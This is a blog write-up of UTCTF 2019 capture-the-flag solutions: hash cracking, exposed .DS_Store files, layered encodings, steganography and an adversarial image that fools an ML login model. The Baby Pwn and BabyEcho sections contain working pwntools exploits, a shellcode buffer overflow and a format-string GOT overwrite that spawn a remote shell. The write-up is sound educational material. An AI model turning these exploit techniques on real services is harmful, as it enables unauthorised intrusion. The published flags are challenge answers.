---
title: "UTCTF 2019 Writeup"
date: 2019-03-11T08:28:09+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up",
  'machine-learning'
]
description: My solves for UTCTF 2019 challenges
---

# [basics] re - 100pts

## Problem

I know there's a string in this binary somewhere.... Now where did I leave it?

by balex

[calculator](/blog/2019-03-11-utctf-writeup/re/calculator)

## Solution

```
❯ strings calculator | grep flag
utflag{str1ng5_15_4_h4ndy_t00l}
```

flag: `utflag{str1ng5_15_4_h4ndy_t00l}`

# simple python script - 750pts

## Problem

simple python script I wrote while not paying attention in graphics

by asper

[wtf.py](/blog/2019-03-11-utctf-writeup/simple python script/wtf.py)

## Solution

`inputs` contains five sha1 hashes. You can get the hashes by adding a print statement in the source code.

Crack the hashes using a website:

```

# 26d33687bdb491480087ce1096c80329aaacbec7 SHA1 puppy 
# 1C3BCF656687CD31A3B486F6D5936C4B76A5D749 SHA1 p1zza 
# 11A3E059C6F9C223CE20EF98290F0109F10B2AC6 SHA1 anime 
# 6301CB033554BF0E424F7862EFCC9D644DF8678D SHA1 torus 
# 95d79f53b52da1408cc79d83f445224a58355b13 SHA1 kitty 
```

Concatenate the strings and you get the flag.

flag: `puppyp1zzaanimetoruskitty`

# HabbyDabby's Secret Stash - 650pts

## Problem

HabbyDabby's hidden some stuff away on his web server that he created and wrote from scratch on his Mac. See if you can find out what he's hidden and where he's hidden it!

http://a.goodsecurity.fail/

by copperstick6

## Solution

The challenge description mentions that the website is made using a Mac; therefore, we can look for `.DS_Store` files. I used [this project](https://github.com/lijiejie/ds_store_exp) on github to reveal the path for the flag:

```
❯ python ds_store_exp.py http://a.goodsecurity.fail/\?file\=.DS_Store
[+] http://a.goodsecurity.fail/?file=.DS_Store
[+] http://a.goodsecurity.fail/?file=a
[+] http://a.goodsecurity.fail/?file=e/.DS_Store
 [+] http://a.goodsecurity.fail/?file=d
[+] http://a.goodsecurity.fail/?file=a/.DS_Store
[+] http://a.goodsecurity.fail/?file=index.html
[+] http://a.goodsecurity.fail/?file=d/.DS_Store
 [+] http://a.goodsecurity.fail/?file=index.html/.DS_Store
[+] http://a.goodsecurity.fail/?file=c
[+] http://a.goodsecurity.fail/?file=e
[+] http://a.goodsecurity.fail/?file=c/.DS_Store
[+] http://a.goodsecurity.fail/?file=b
[+] http://a.goodsecurity.fail/?file=b/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/a/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/c
[+] http://a.goodsecurity.fail/?file=e/b/.DS_Store
 [+] http://a.goodsecurity.fail/?file=e/b
 [+] http://a.goodsecurity.fail/?file=e/c/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/e
[+] http://a.goodsecurity.fail/?file=e/a
[+] http://a.goodsecurity.fail/?file=e/e/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/d
[+] http://a.goodsecurity.fail/?file=e/d/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/d/b
[+] http://a.goodsecurity.fail/?file=e/d/b/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/d/e
[+] http://a.goodsecurity.fail/?file=e/d/e/.DS_Store
[+] http://a.goodsecurity.fail/?file=e/d/e/flag.txt/.DS_Store
 [+] http://a.goodsecurity.fail/?file=e/d/e/flag.txt
```

Side note: The code from the repo didn't work for me at first, and I have comment out this part:

```python
if not os.path.exists(folder_name):
  os.makedirs(folder_name)
with open(netloc.replace(':', '_') + path, 'wb') as outFile:
  self.lock.acquire()
  print '[+] %s' % url
  self.lock.release()
  outFile.write(data)
```
Now with the path, we can get the flag:

```
❯ curl http://a.goodsecurity.fail/\?file\=e/d/e/flag.txt
utflag{mac_os_hidden_files_are_stupid}
```

flag: `utflag{mac_os_hidden_files_are_stupid}`

# [basics] crypto - 200pts

## Problem

Can you make sense of this file?

by balex

[binary.txt](/blog/2019-03-11-utctf-writeup/crypto/binary.txt)

## Solution

Basic crypto...

```python
from pwn import *
with open('./binary.txt') as f:
  data = f.read()

data = unbits(data.strip().replace(' ', ''))
print data

print '--------------------------------'

data = data.split('one.)\n')[-1]
data = data.decode('base64') 
print data

print '--------------------------------'

data = data.split('n people).\n')[-1]

# https://stackoverflow.com/questions/3269686/short-rot13-function-python
def rot(n):
  from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans
  lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
  return lambda s: s.translate(lookup)

# for i in range(26):
#   print '{}: {}'.format(i, rot(i)(data))

data = rot(16)(data)
print data

print '--------------------------------'

# https://www.guballa.de/substitution-solver
# congratulations! you have finished the beginner cryptography challenge. here is a flag for all your hard efforts: utflag{3ncrypt10n_15_c00l}. you will find that a lot of cryptography is just building off this sort of basic knowledge, and it really is not so bad after all. hope you enjoyed the challenge!
```

flag: `utflag{3ncrypt10n_15_c00l}`

# Jacobi's Chance Encryption - 750pts

## Problem

Public Key `569581432115411077780908947843367646738369018797567841`

Can you decrypt Jacobi's encryption?

```python
def encrypt(m, pub_key):

    bin_m = ''.join(format(ord(x), '08b') for x in m)
    n, y = pub_key

    def encrypt_bit(bit):
        x = randint(0, n)
        if bit == '1':
            return (y * pow(x, 2, n)) % n
        return pow(x, 2, n)

    return map(encrypt_bit, bin_m)
```

by asper

[flag.enc](/blog/2019-03-11-utctf-writeup/Jacobis Chance Encryption/flag.enc)

## Solution

Looking at the `encrypt` function, `(y * pow(x, 2, n)) % n` is more likely to be `1` and `pow(x, 2, n)` is more likely to be `0`. Using this we can write a script to extract the message:

```python
# https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&input=OGE4Yjk5OTM5ZTk4ODQ5Yjk2OWJhMDhhYTA4ZjllODZhMDllOGI4YjlhOTE4Yjk2OTA5MWEwOTY5MWEwOTE4YTkyOWQ5YThkYTA4Yjk3OWE5MDhkODY4Mjgw
from pwn import *
# pub_key = '569581432115411077780908947843367646738369018797567841'

def encrypt(m, pub_key):

    bin_m = ''.join(format(ord(x), '08b') for x in m)
    n, y = pub_key

    def encrypt_bit(bit):
        x = randint(0, n)
        if bit == '1':
            return (y * pow(x, 2, n)) % n
        return pow(x, 2, n)

    return map(encrypt_bit, bin_m)

def decrypt(m):
  output = ''
  for e in m.strip().split(','):
    if e == '0':
      output += '0'
    else:
      output += '1'
  return unbits(output)

print decrypt(open('./flag.enc').read()).encode('hex')
```

```
❯ python chal.py
8a8b99939e98849b969ba08aa08f9e86a09e8b8b9a918b969091a09691a0918a929d9a8da08b979a908d868280
```

This did not give us the flag; however, the bytes look like the result of a xor operation.

I used cyberchef to brute force the xor key and got the flag:

> https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&input=OGE4Yjk5OTM5ZTk4ODQ5Yjk2OWJhMDhhYTA4ZjllODZhMDllOGI4YjlhOTE4Yjk2OTA5MWEwOTY5MWEwOTE4YTkyOWQ5YThkYTA4Yjk3OWE5MDhkODY4Mjgw

flag: `utflag{did_u_pay_attention_in_number_theory}`

# [basics] forensics - 100pts

## Problem

My friend said they hid a flag in this picture, but it's broken!

by balex

[secret.jpg](/blog/2019-03-11-utctf-writeup/forensics/secret.jpg)

## Solution

The file is a text file instead of a image:

```
❯ file secret.jpg
secret.jpg: ASCII text

❯ cat secret.jpg
utflag{d0nt_tru5t_f1l3_3xt3ns10n5}
```

flag: `utflag{d0nt_tru5t_f1l3_3xt3ns10n5}`

# FaceSafe - 1400pts

## Problem

Can you get the secret? http://facesafe.xyz

Like any startup nowadays, FaceSafe had to get on the MACHINELEARNING™ train. Also, like any other startup, they may have been too careless about exposing their website metadata...

Hint: MACHINELEARNING™ logic: if it looks like noise, swims like noise, and quacks like noise, then it's probably... a deer?

written by patil215

## Solution

First, I found the `robots.txt` page:

```
❯ curl http://facesafe.xyz/robots.txt
User-agent: *
Disallow: /api/model/auth
Disallow: /api/model/check
Disallow: /api/model/expose
Disallow: /api/model/infer
Disallow: /api/model/model_metadata.json
Disallow: /api/model/model.model
Disallow: /static/event.png
Disallow: /static/find.png
Disallow: /static/bad.png
```

Then, I downloaded the [ML model](/blog/2019-03-11-utctf-writeup/FaceSafe/model.model)

From this point onward, it's basically the same as the [mlAuth in nullcon HackIM 2019](/blog/posts/2019-02-03-nullcon-hackim-writeup/#mlauth) and [Dog or Frog in PicoCTF 2018](/blog/posts/picoctf-2018-writeup/general-skills/#dog-or-frog).

Here is solution code:

```python
from keras.applications.mobilenet import preprocess_input
from keras.models import load_model
from keras.preprocessing.image import img_to_array, array_to_img
from PIL import Image
from imagehash import phash
import numpy as np
from keras import backend as K

IMAGE_DIMS = (32, 32)
GOAL_IND = 4
img_path = './black.png'


model = load_model('./model.model')
model.summary()

def prepare_image(image, target=IMAGE_DIMS):
    # if the image mode is not RGB, convert it
    if image.mode != "RGB":
        image = image.convert("RGB")

    # resize the input image and preprocess it
    image = image.resize(target)
    image = img_to_array(image)
    image = np.expand_dims(image, axis=0)
    image = preprocess_input(image)
    # return the processed image
    return image

original_image = Image.open(img_path).resize(IMAGE_DIMS)
original_image = prepare_image(original_image)
hacked_image = np.copy(original_image)


model_input_layer = model.layers[0].input
model_output_layer = model.layers[-1].output

cost_function = model_output_layer[0][GOAL_IND]
gradient_function = K.gradients(cost_function, model_input_layer)[0]
grab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])

learning_rate = 0.1
cost = 0.0

while cost < 0.65:
    cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0])

    hacked_image += np.sign(gradients) * learning_rate

    hacked_image = np.clip(hacked_image, -1.0, 1.0)

    print("value: {:.8}%".format(cost * 100))

hacked_image = hacked_image.reshape((32,32,3))
img = array_to_img(hacked_image)
img.save('./hacked.png')
```

And here is the final image:

<img style="image-rendering: pixelated;image-rendering: -moz-crisp-edges;image-rendering: crisp-edges;" src="/blog/2019-03-11-utctf-writeup/FaceSafe/hacked.png"/>

flag: `utflag{n3ur4l_n3t_s3cur1ty_b4d_p4d1ct4b1l1ty}`

# Baby Pwn - 650pts

## Problem

`nc stack.overflow.fail 9000`

by hk

[babypwn](/blog/2019-03-11-utctf-writeup/Baby Pwn/babypwn)

## Solution

Standard pwn challenge. Write shellcode to `.bss` and jump there using the buffer overflow.

Here's the script:

```python
from pwn import *
import sys
argv = sys.argv

DEBUG = True
BINARY = './babypwn'

context.binary = BINARY

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)
else:
  sh = remote('stack.overflow.fail', 9000)

name_addr = 0x601080

sh.sendlineafter('?\n', asm(shellcraft.amd64.linux.sh()))

sh.sendlineafter(': ', '+')

sh.sendlineafter(': ', '1')

payload = 'a'*(0x90-1)+'+'+p64(name_addr)*2

sh.sendlineafter(': ', payload)

sh.interactive()
```

flag: `utflag{0h_n0_i_f0rg0t_t0_carry_the_return}`

# BabyEcho - 700pts

## Problem

I found this weird echo server. Can you find a vulnerability?

`nc stack.overflow.fail 9002`

by jitterbug_gang

[pwnable](/blog/2019-03-11-utctf-writeup/BabyEcho/pwnable)

## Solution

Standard format string attack. The script is pretty self explanatory:

```python
from pwn import *
import sys
argv = sys.argv

DEBUG = True
BINARY = './pwnable'

context.binary = BINARY

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)
else:
  sh = remote('stack.overflow.fail', 9002)

printf_got = 0x804a010
exit_got = 0x804a01c
fgets_got = 0x804a014

main_addr = 0x0804851b

payload = 'A'*2
payload += p32(printf_got)
payload += p32(exit_got)



payload += '%11$n'
pause()

# stage 1: loop
p1 = 'A'*2
p1 += p32(exit_got)
p1 += p32(exit_got+2)
p1 += '%{}x'.format(0x851b-10)
p1 += '%11$hn'
p1 += '%{}x'.format((0x10000-(0x851b))+0x0804)
p1 += '%12$hn'
sh.sendlineafter('.\n', p1)

# stage 2: find libc version
# https://libc.blukat.me/?q=_IO_printf%3A020%2C_IO_fgets%3A620&l=libc6-i386_2.23-0ubuntu11_amd64
# p2 = 'A'*2
# p2 += p32(printf_got)
# p2 += '%11$s'

# sh.sendlineafter('.\n', p2)

# print hex(u32(sh.recvuntil('back').split('\n')[0][6:6+4])) #0xf7dd4020

# p2 = 'A'*2
# p2 += p32(fgets_got)
# p2 += '%11$s'

# sh.sendlineafter('.\n', p2)

# print hex(u32(sh.recvuntil('back').split('\n')[0][6:6+4])) #0xf7de8620

# stage 3: leak libc base and find system

p3 = 'A'*2
p3 += p32(printf_got)
p3 += '%11$s'

sh.sendlineafter('.\n', p3)

libc_base = u32(sh.recvuntil('back').split('\n')[0][6:6+4]) - 0x049020
system_addr = libc_base + 0x03a940

# stage 4: change prinf to system and win
p1 = 'A'*2
p1 += p32(printf_got)
p1 += p32(printf_got+2)
p1 += '%{}x'.format((system_addr&0xffff)-10)
p1 += '%11$hn'
p1 += '%{}x'.format((0x10000-(system_addr&0xffff))+(system_addr >> 16))
p1 += '%12$hn'
sh.sendlineafter('.\n', p1)

sh.sendlineafter('.\n', '/bin/sh')

sh.interactive()
```

flag: `utflag{gassssssssssp3r_mad3_m3_wr1t3_th1s}`

# UTCTF adventure ROM - 1000pts

## Problem

D-Pad to move

A to select

See if you can win!

Be careful, there are invisible lines that kill you

by asper

[hack.gb](/blog/2019-03-11-utctf-writeup/UTCTF adventure ROM/hack.gb)

## Solution

Running the game in `OpenEmu` looks like this:

<img style="image-rendering: pixelated;image-rendering: -moz-crisp-edges;image-rendering: crisp-edges;" src="/blog/2019-03-11-utctf-writeup/UTCTF adventure ROM/screen.png"/>

The player have to move around avoiding invisible blocks and go to the four corners in the correct order.

I utilized the saves feature in OpenEmu and brute forced the sequence by hand.

flag: `aabdcacbbdbcdcad`

# Low Sodium Bagel - 300pts

## Problem

I brought you a bagel, see if you can find the secret ingredient.

by balex

[low-sodium-bagel.jpeg](/blog/2019-03-11-utctf-writeup/Low Sodium Bagel/low-sodium-bagel.jpeg)

## Solution

Simple challenge where you have to extract the flag using steghide:

```
$ steghide extract -sf low-sodium-bagel.jpeg -p ""
wrote extracted data to "steganopayload4837.txt".
$ cat steganopayload4837.txt
utflag{b1u3b3rry_b4g3ls_4r3_th3_b3st}
```

flag: `utflag{b1u3b3rry_b4g3ls_4r3_th3_b3st}`